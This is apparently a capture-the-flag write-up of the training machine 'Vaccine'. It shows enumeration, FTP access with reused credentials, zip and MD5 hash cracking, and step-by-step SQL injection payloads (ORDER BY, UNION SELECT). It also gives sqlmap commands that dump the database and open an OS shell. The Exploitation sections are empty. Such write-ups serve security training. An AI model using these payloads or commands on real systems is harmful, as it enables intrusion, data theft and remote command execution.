# Starting Point - Vaccine

## Enumeration

```
rustscan 10.10.10.46 -- -sC -sV -o port_scan

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
22/tcp open  ssh     syn-ack OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: MegaCorp Login
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```


### Examine Port 80 - Apache Server

![](pics/apache_server.png)

Seems to be a login website. Using the credentials `admin:MEGACORP_4dm1n!!` of the previous challenge fails. So this is a dead end for now. 

Let's try to scan the server for other directories. For this, we can use a tool like `dirb`, `dirbuster` or `gobuster`

```
gobuster dir -u "http://10.10.10.46" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

While this is running, we can check out the open FTP port.


### Examine Port 21 - FTP

In the previous challenge, we found some FTP credentials in the Filezilla configs that belonged to root. 

```
<User>ftpuser</User>
<Pass>mc@F1l3ZilL4</Pass>
```

![](pics/ftp_login.png)

And indeed! We can login.

In there, we find a file called `backup.zip`. 
```
-rw-r--r--    1 0        0            2533 Feb 03  2020 backup.zip
```
Using the `GET` command we can download it to our local machine. Unfortunately, the zip file is password protected.

However, we can try to bruteforce the password with `john`.
Therefore, we first have to use the tool `zip2john`. It converts the zip file into a understandable format for john.

```
backup.zip:$pkzip2$2*2*1*0*8*24*3a41*5722*543fb.....
```

Afterwards, we can use `john` to crack the hash.

```
$ john backup_hash -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Press 'q' or Ctrl-C to abort, almost any other key for status
741852963        (backup.zip)
1g 0:00:00:00 DONE (2021-01-02 12:26) 50.00g/s 44800p/s 44800c/s 44800C/s michelle1..ilovegod
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Success! The password for the zip is `741852963`.

Unzipping the file, we receive two files:

1) index.php
2) style.css

Opening the `index.php` file we see following:
```html
</head>
  <h1 align=center>MegaCorp Login</h1>
<body>
<!-- partial:index.partial.html -->
<body class="align">
```
That seems familiar, right? That's the login page on Port 80.
Let's further investigate the file.

```php
<?php
session_start();
  if(isset($_POST['username']) && isset($_POST['password'])) {
    if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
      $_SESSION['login'] = "true";
      header("Location: dashboard.php");
    }
  }
?>
```
The php code reveals the valid username (`admin`) and the md5 hash of the password (`2cb42f8734ea607eefed3b70af13bbd3`). So all that's left, is to crack the md5 hash. 

For such a task I usually use [crackstation](https://crackstation.net/).

![](pics/crackstation.png)

There we have it! The password is `qwerty789`

## Further Examine Port 80 - Login Page

Using the credentials `admin:qerty789` we can successfully login and get access to the MegaCorp Car Catalogue (/dashboard.php).

![](pics/megacorp_car_catalogue.png)

The dashboard contains information about several Cars. I'm assuming they are loaded from a database. Furthermore, the website only has a SEARCH functionality. Sourcecode, cookies etc did not reveal any interesting information. So what can you do with that SEARCH field?

Searching for "ELIXIR" (one of the car names), changes the dashboard content, so that only Elixir is shown. If we search for "SPORTS" (one of the car types), the page stays empty.

So my guess is that, once we hit that SEARCH button, an SQL query is sent to the database, to retrieve all results with the attribute `carname/car/name` set to our value. From an attacker's perspective, this can be vulnerable to SQL Injection if not implemented carefully. So let's try that.

![](pics/test_sqli.png)

By inserting a single `'`character into the search field and pressing enter, we get following error message: `ERROR: unterminated quoted string at or near "'" LINE 1: Select * from cars where name ilike '%'%' ^`. So here we have the proof, that the search field is indeed vulnerable to SQL injection. Let's gain information about the database by following these steps:

1) Find out how many columns are in the `cars` table.
  
    By injecting `' ORDER BY 1--`, and increasing the number until we receive an error, tells us how many columns exist. In our case, we get the error with `' ORDER BY 6--`. Therefore, we know the `cars` table has 5 columns.

2) Gain information about the column types

    Now that we know how many columns there are, we can extract further information with the [SQL Injection UNION attack](https://portswigger.net/web-security/sql-injection/union-attacks). 

    - `' UNION SELECT 'a', NULL, NULL, NULL, NULL --` : ERROR
    - `' UNION SELECT NULL, 'a', NULL, NULL, NULL --` : VALID
    - `' UNION SELECT NULL, NULL, 'a', NULL, NULL --` : VALID
    - `' UNION SELECT NULL, NULL, NULL, 'a', NULL --` : VALID
    - `' UNION SELECT NULL, NULL, NULL , NULL, 'a' --` : VALID

    From this, we knw that we can extract valuable information when modifying index 1-4 of the UNION query.

3) Extract valuable information (table names etc)

    Using the [Portswigger SQLI Cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet), we can retrieve a lot of information about the database system:
    
    - Version: `' UNION SELECT NULL, NULL, NULL , NULL, VERSION() --`: PostgreSQL 11.5 (Ubuntu 11.5-1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.1.0-9ubuntu2) 9.1.0, 64-bit
    - Table names: `' UNION SELECT NULL, table_schema, table_name, NULL, NULL FROM information_schema.tables --`


This all could be have been done automatically by using `sqlmap`, but for the sake of learning: keep doing it manually!

```
sqlmap -u 'http://10.10.10.46/dashboard.php?search=a' --cookie="PHPSESSID=vmnafl0uct1r97s1k5bkpoiopg" --dump-all --tamper=space2comment

and 

sqlmap -u 'http://10.10.10.46/dashboard.php?search=a' --cookie="PHPSESSID=vmnafl0uct1r97s1k5bkpoiopg" --os-shell
```

## Exploitation

## Post Exploitation